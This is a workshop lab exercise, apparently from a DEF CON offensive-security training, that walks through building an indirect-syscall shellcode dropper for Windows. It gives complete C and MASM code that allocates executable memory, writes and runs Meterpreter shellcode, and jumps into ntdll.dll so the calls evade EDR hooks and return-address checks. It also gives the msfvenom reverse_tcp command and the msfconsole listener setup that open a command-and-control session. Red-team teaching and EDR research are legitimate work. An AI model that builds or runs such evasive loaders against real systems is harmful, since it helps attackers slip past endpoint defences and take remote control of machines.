## LAB Exercise 5: Indirect Syscall Dropper
Related to the Win32 dropper, in this exercise we will make the third modification, creating the indirect syscall dropper. We will call this the indirect syscall dropper. 

The main difference between the direct syscall dropper and the indirect syscall dropper is that **only part of the syscall stub** from a native function is **implemented directly** into the indirect syscall dropper itself. This means that we implement and execute ``mov r10, rcx``, ``mov eax, SSN`` and ``jmp qword ptr`` in the direct syscall dropper, but unlike the direct syscall dropper, we do not execute the syscall and return from the indirect syscall dropper's memory. Instead, we use ``jmp qword ptr`` to jump to the syscall address of the native function in ntdll.dll and **execute the syscall and return** from the **memory location of ntdll.dll**. Why this has an advantage over the direct syscall dropper is discussed in the next chapter, where we compare the direct syscall and indirect syscall techniques in the context of EDR evasion.
That means, our goal is  and implement the required syscalls or syscall stubs from each of the four native functions directly into the assembly (dropper). 
<details>
     <p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/3343820f-1dbe-4519-b63e-9647df5d1e52">
</p>
</details>

## Exercise 5 Tasks: 
1. Download the indirect syscall dropper poc from the code section of this chapter.
2. Most of the code is already implemented in the poc. However, you have to complete the indirect syscall dropper by performing the following tasks:
     - Create a new header file ``syscalls.h`` and use the supplied code for syscalls.h, which follows in this playbook. Also include syscalls.h in the main code as header syscalls.h.
     - Import the ``syscalls.asm`` file as a resource and complete the assembly code by adding the missing assembler code for the remaining three native APIs following the scheme of the already implemented code for NtAllocateVirtualMemory. 
     - Enable Microsoft Macro Assembler (MASM) in the direct syscall poc in Visual Studio.  
     - Declare the three missing global variables to hold syscall instruction addresses
3. Create a staged x64 meterpreter shellcode with msfvenom, copy it to the poc and compile the poc. 
4. Create and run a staged x64 meterpreter listener using msfconsole.
5. Run your compiled .exe and check that a stable command and control channel opens. 
6. Use the Visual Studio **dumpbin** tool to analyse the syscall dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
7. Use **x64dbg** to debug or analyse the dropper. 
     - Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?
     - Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected?


## Visual Studio
You can download the poc from the code section of this chapter. The code works as follows, shellcode declaration is done as before.
<details>
    
```C
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
    
</details>

### Syscall and Return 
As mentioned at the beginning of this chapter, we want to execute the ``syscall`` and ``return`` statements from the syscall stub of the native functions we are using from the memory of ntdll.dll. Therefore, we need to jump from the memory of the indirect dropper.exe to the syscall address of the corresponding native function in the memory of ntdll.dll at the right time This is done by executing ``jmp qword ptr`` in the indirect syscall dropper after ``mov r10, rcx`` and ``mov eax, SSN`` have been executed. To do this, we need to
- Open a handle to ntdll.dll at runtime using ``GetModuleHandleA``. 
- Get the start address of the native function in ntdll.dll using ``GetProcAddress`` and store it in a variable declared as a function pointer. 
- Get the memory address of the syscall instruction in the syscall stub by adding the required offset and store it in a variable declared as a global variable.

#### Handle to ntdll.dll
First, we want to use the following code which uses the function ``GetModuleHandleA`` to open a handle to ntdll.dll at runtime. This code is already implemented in the indirect syscall poc.
<details>
<summary>Code</summary>
    
```C
// Get a handle to the ntdll.dll library
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");     
```
     
</details>   

#### Start Address Native Function
Then we want to use the following code which uses the ``GetProcAddress`` function to get the start address of the respective native function in the memory of ntdll.dll and store it in a variable declared as a function pointer. In the indirect syscall poc, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.  
<details>
<summary>Code</summary>
    
```C
// Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");     
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 
<details>
<summary>solution</summary>
    
```C
// Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");     
```
     
</details>   


#### Memory Address Syscall Instruction
In the next step, we want to get the effective memory address from the syscall instruction in the syscall stub of the native function by adding the necessary offset to the start address of the native function that we retrieved in the previous step. To get the memory address from the syscall instruction, we need to add 12bytes. Why 12 bytes? Because this is the offset calculated from the start address of the native function. 
<details>
    <p align="center">
<img width="900" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/ba7fa1f5-be69-46d7-b564-6546089c0ad0"> 
    </p>
</details>   

In the indirect syscall poc, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.  
<details>
<summary>Code</summary>
    
```C
// The syscall stub (actual system call instruction) is some bytes further into the function. 
    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
    // So we add 0x12 to the function's address to get the address of the system call instruction.
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;     
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 
<details>
<summary>solution</summary>
    
```C
// The syscall stub (actual system call instruction) is some bytes further into the function. 
    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
    // So we add 0x12 to the function's address to get the address of the system call instruction.
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;     
```
     
</details>


#### Global Variables
To store the memory address from the syscall instruction of the respective native function, and also to be able to provide the memory address later for the assembly code in the ``syscalls.asm`` file, we declare a global variable for each syscall address, which is declared as a pointer. Also in this case in the indirect syscall poc, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.
<details>
<summary>Code</summary>
    
```C
// Declare global variables to hold the syscall instruction addresses
UINT_PTR sysAddrNtAllocateVirtualMemory;     
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 
<details>
<summary>solution</summary>
    
```C
// Declare global variables to hold the syscall instruction addresses
UINT_PTR sysAddrNtAllocateVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
UINT_PTR sysAddrNtCreateThreadEx;
UINT_PTR sysAddrNtWaitForSingleObject;     
```
     
</details>



The full **main code** of the **indirect syscall dropper** looks like this, and is already implemented in the poc from this chapter and can be downloaded. Again, we use the same native APIs to allocate memory, write memory, create a new thread and wait for exit.
<details>
<summary>Code</summary>
    
```C
#include <windows.h>  
#include <stdio.h>    
#include "syscalls.h"

// Declare global variables to hold the syscall instruction addresses
UINT_PTR sysAddrNtAllocateVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
UINT_PTR sysAddrNtCreateThreadEx;
UINT_PTR sysAddrNtWaitForSingleObject;


int main() {
    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)

    // Get a handle to the ntdll.dll library
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");

    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");


    // The syscall stub (actual system call instruction) is some bytes further into the function. 
    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
    // So we add 0x12 to the function's address to get the address of the system call instruction.
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;



    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    // Define the shellcode to be injected
    unsigned char shellcode[] = "\xfc\x48\x83...";

    ULONG bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 to indicate successful execution of the program.
    return 0;
}
```
    
</details>

    
### Header File
Like the direct syscall dropper, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. 
     
Additional information if you want to check the function definition manually should be available in the Microsoft documentation, e.g. for [NtAllocateVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory). 

<details>
<summary>Code</summary>

```C
#ifndef _SYSCALLS_H  // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion.
#define _SYSCALLS_H  // Define _SYSCALLS_H

#include <windows.h>  // Include the Windows API header

#ifdef __cplusplus   // If this header file is included in a C++ file, then this section will be true
extern "C" {         // This is to ensure that the names of the functions are not mangled by the C++ compiler and are in C linkage format
#endif

    // The type NTSTATUS is typically defined in the Windows headers as a long.
    typedef long NTSTATUS;  // Define NTSTATUS as a long
    typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

    // Declare the function prototype for NtAllocateVirtualMemory
    extern NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,    // Handle to the process in which to allocate the memory
        PVOID* BaseAddress,      // Pointer to the base address
        ULONG_PTR ZeroBits,      // Number of high-order address bits that must be zero in the base address of the section view
        PSIZE_T RegionSize,      // Pointer to the size of the region
        ULONG AllocationType,    // Type of allocation
        ULONG Protect            // Memory protection for the region of pages
    );

    // Declare the function prototype for NtWriteVirtualMemory
    extern NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,     // Handle to the process in which to write the memory
        PVOID BaseAddress,        // Pointer to the base address
        PVOID Buffer,             // Buffer containing data to be written
        SIZE_T NumberOfBytesToWrite, // Number of bytes to be written
        PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
    );

    // Declare the function prototype for NtCreateThreadEx
    extern NTSTATUS NtCreateThreadEx(
        PHANDLE ThreadHandle,        // Pointer to a variable that receives a handle to the new thread
        ACCESS_MASK DesiredAccess,   // Desired access to the thread
        PVOID ObjectAttributes,      // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes
        HANDLE ProcessHandle,        // Handle to the process in which the thread is to be created
        PVOID lpStartAddress,        // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread
        PVOID lpParameter,           // Pointer to a variable to be passed to the thread
        ULONG Flags,                 // Flags that control the creation of the thread
        SIZE_T StackZeroBits,        // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer
        SIZE_T SizeOfStackCommit,    // The size of the stack that must be committed at thread creation
        SIZE_T SizeOfStackReserve,   // The size of the stack that must be reserved at thread creation
        PVOID lpBytesBuffer          // Pointer to a variable that receives any output data from the system
    );

    // Declare the function prototype for NtWaitForSingleObject
    extern NTSTATUS NtWaitForSingleObject(
        HANDLE Handle,          // Handle to the object to be waited on
        BOOLEAN Alertable,      // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread
        PLARGE_INTEGER Timeout  // Pointer to a LARGE_INTEGER that specifies the absolute```c
        // or relative time at which the function should return, regardless of the state of the object
    );

#ifdef __cplusplus  // End of the 'extern "C"' block if __cplusplus was defined
}
#endif

#endif // _SYSCALLS_H  // End of the _SYSCALLS_H definition
  
```
    
</details>
    
<details>
<summary>Solution</summary>   
    <p align="center">
<img width="500" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/5fbb39c6-be30-4641-8652-6b98e478e17f"> 
    </p>
    <p align="center">   
    <img width="800" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/d116e34d-8bea-4d4b-a437-a27594218a5b">
    </p>
    <p align="center">
    <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/4b3e7f58-b6c1-492a-9516-46dcf3af942c">
    </p>
</details>     
    

### Assembly Instructions
As in the direct syscall dropper, we do not want to ask ntdll.dll for the syscall stub or the content or code of the syscall stub (assembly instructions ``mov r10, rcx``, ``mov eax, SSN`` etc.) of the native functions we use, instead we have to implement the necessary assembly code in the assembly itself. But compared to the direct syscall dropper, in the **indirect syscall dropper** we only implement a part of the syscall stub directly. That is, we implement ``mov r10, rcx``, ``mov eax, SSN``, but we replace the ``syscall`` instruction with ``jmp qword ptr``. This allows us to jump to the memory address of the syscall instruction in the memory of ntdll.dll, and the syscall- and return-instructions are executed in the memory of ntdll.dll. 
     
     
Also in this case, instead of using a tool to create the necessary assembly instructions, for the best learning experience we will **manually implement** the **assembly code** in our indirect syscall poc. To do this, you will find a file called ``syscalls.asm`` in the indirect syscall dropper poc directory, which contains some of the required assembler code. Compared to the direct syscall dropper poc, in the ``syscalls.asm`` file of the indirect syscall dropper poc, we need to be able to call the memory address of the respective syscall. This is necessary to realise the jmp in the memory of ntdll.dll. This is done with the following code for the syscall instructions of ``NtAllocateVirtualMemory``.
     
The code below shows the assembler code for the syscall stub of ``NtAllocateVirtualMemory`` which is already implemented in the syscalls.asm file. 

<details>
<summary>Code</summary>

```asm
EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
     
.CODE  ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVirtualMemory ENDP                     	; End of the procedure.     
     
END  ; End of the module     
     
```
    
</details>
     
 
It is **your task** to **add** the ``syscalls.asm`` file as a resource (existing item) to the indirect syscall dropper project and **complete the assembler code and C code** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.

If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for Windows 10 Enterprise 22H2 and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
    
<details>
    <summary>Solution</summary>

```asm
EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
EXTERN sysAddrNtWriteVirtualMemory:QWORD            ; The actual address of the NtWriteVirtualMemory syscall in ntdll.dll.
EXTERN sysAddrNtCreateThreadEx:QWORD                ; The actual address of the NtCreateThreadEx syscall in ntdll.dll.
EXTERN sysAddrNtWaitForSingleObject:QWORD           ; The actual address of the NtWaitForSingleObject syscall in ntdll.dll.


.CODE  ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVirtualMemory ENDP                     	; End of the procedure.


; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3AH
    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
NtWriteVirtualMemory ENDP


; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, 0C2h
    jmp QWORD PTR [sysAddrNtCreateThreadEx]
NtCreateThreadEx ENDP


; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, 4
    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
NtWaitForSingleObject ENDP

END  ; End of the module
```
    
</details>

     
    
### Microsoft Macro Assembler (MASM)
We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the direct syscall poc, we need to do a few things. These steps are not done in the downloadable poc and must be done manually. First, we need to **enable support** for **Microsoft Macro Assembler (MASM)** in the Visual Studio project by enabling the option in Build Dependencies/Build Customisations.
<details>
<summary>Solution</summary> 
<p align="center">
<img width="1278" alt="image" src="https://user-images.githubusercontent.com/50073731/235457590-371f3519-b7cf-483d-9c1c-6bfd6368be42.png">
<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
</details>

We also need to set the **item type** of the **syscalls.asm** file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in the direct syscall dropper. We also set Excluded from Build to no and Content to yes. 
<details>
<summary>Solution</summary> 
    <p align="center">
<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
<img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
<img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
    </p>
</details>     

    

## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
 **kali>**   
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the direct syscall dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>    


## MSF-Listener
Before we test the functionality of our direct syscall dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled direct syscall dropper. If all goes well, you should see an incoming command and control session. 
<details>
    
<p align="center">
<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>
        

    
## Indirect Syscall Dropper Analysis: Dumpbin 
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>    
    
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports Path/to/Direct_Syscall_Dropper.exe
```
</details>    

<details>
    <summary>Solution</summary>  
    
**No imports** from the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
<p align="center">
<img width="1023" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/b9206b4f-9dde-4848-9637-d18f43095799">
</p>
</details>   
    
    
## Inirect Syscall Dropper Analysis: x64dbg 
The first step is to run your direct syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
Then we open x64dbg and attach to the running process, note that if you open the indirect syscall dropper directly in x64dbg, you need to run the assembly first.
<details>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
</p>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/3547125b-a8c2-4e17-b7ec-84434181cf36">
</p>    
</details>
     
    
First we want to check which APIs (Win32 or Native) are being imported and from which module or memory location. Remember that in the indirect syscall dropper we no longer use Win32 APIs in the code and have implemented the structure for the native functions directly in the assembly. What results do you expect?
<details>
    <summary>Solution</summary>
     Checking the imported symbols in our indirect syscall dropper, we should again see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are no longer imported by kernel32.dll, or are no longer imported in general. So the result is the same as with dumpbin and seems to be valid.     
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/2c651658-ae52-47cc-92b2-ccc85325570f">
</p>    
Also, looking at the imported symbols (symbols register), we see that instead of asking ntdll.dll for the code of the four required native functions NtAllocateVirutalMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, these native functions are implemented directly in the .text region of the dropper itself. 
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/66da92d7-c3d5-4efb-a162-ec7287c9d9c4">
</p>  
Also in this case we can also use the "Follow in Disassembler" function to analyse the indirect syscall dropper to identify the lines of code where the calls to the native functions are made. 
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/de56e4f7-8315-4c3f-9308-b2bd9f788d27">
     </p>  
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/33df09d3-c8f1-4ac1-805f-dc881c031658">
     </p>
     
Furthermore, in the case of the indirect syscall dropper, we can identify the lines of code used to open a handle to ntdll.dll using GetModuleHandleA, then get the start address of the native functions using GetProcAdress, and finally calculate the address of the syscall instruction by adding 12bytes as an offset to the start address of the respective native function. 
     <p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/9bee73bf-e16d-4b6c-b096-f95b24dfcdaa">  
</p>  
     
</details>

Also in the case of the indirect syscall dropper we want to check in which module the syscall stub or the assembler instructions of the native functions are implemented and executed. Remember, unlike the direct syscall dropper from the previous chapter, in the indirect syscall dropper poc we have only implemented part of the syscall stub directly into the dropper itself. What results do you expect?
<details>
    <summary>Solution</summary>
     For example, in the context of the native function NtAllocateVirtualMemory , we use the Follow in Disassembler function and should be able to see that
     The syscall stub is not fetched from ntdll.dll, but in the case of the indirect syscall dropper, only part of the assembly instructions are implemented directly into the .text section of the assembly. Furthermore, we can see that the jmp to the memory of ntdll.dll is done via jmp qword ptr and that the syscall statement and the return statement are executed from the memory location of ntdll.dll.    
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a89676e3-0a55-42dd-abd6-36a89a85df94">
     </p> 
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/7f32fc6d-1cc6-4c1b-a2c7-a3c8cfb9243d">
     </p> 
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/77ad3c31-5eff-4402-95a2-ae76342e7715">
     </p>
     </p> 
<p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/10fe80fd-1434-489d-94f8-251e68f4ebe3">
     </p>
</details>


## Summary:
- Made transition from direct syscalls to indirect syscalls
- Dropper imports no longer Windows APIs from kernel32.dll
- Dropper imports no longer Native APIs from ntdll.dll
- Only a part of the syscall stub is directly implemented into .text section of the dropper itself
- The syscall- and return statement are executed from memory of ntdll.dll
- User mode hooks in ntdll.dll and EDR can be bypassed 
- EDR detection based on checking the return adress can be bypassed.
